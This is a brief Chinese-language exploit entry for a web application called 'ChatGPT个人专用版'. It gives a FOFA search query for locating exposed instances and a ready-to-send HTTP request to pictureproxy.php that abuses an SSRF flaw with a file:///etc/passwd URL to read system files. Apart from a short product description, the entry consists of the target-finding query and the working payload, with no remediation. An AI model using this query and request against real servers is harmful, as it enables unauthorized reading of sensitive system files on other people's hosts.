# ChatGPT个人专用版 pictureproxy SSRF漏洞

**fofa**

```
title="ChatGPT个人专用版"
```

**一、漏洞简述**

ChatGPT个人专用版是一种基于人工智能的对话系统，旨在为用户提供个性化的交流体验。它能够理解和生成自然语言，帮助用户解决问题、获取信息或进行创意交流。通过不断学习和优化，ChatGPT个人专用版可以更好地适应用户的需求和偏好，提供更为精准和贴心的服务。其接口pictureproxy.php存在SSRF漏洞，攻击者可通过该漏洞获取系统敏感文件信息。

二、漏洞检测poc

```YAML
GET /pictureproxy.php?url=file:///etc/passwd HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Connection: close


```

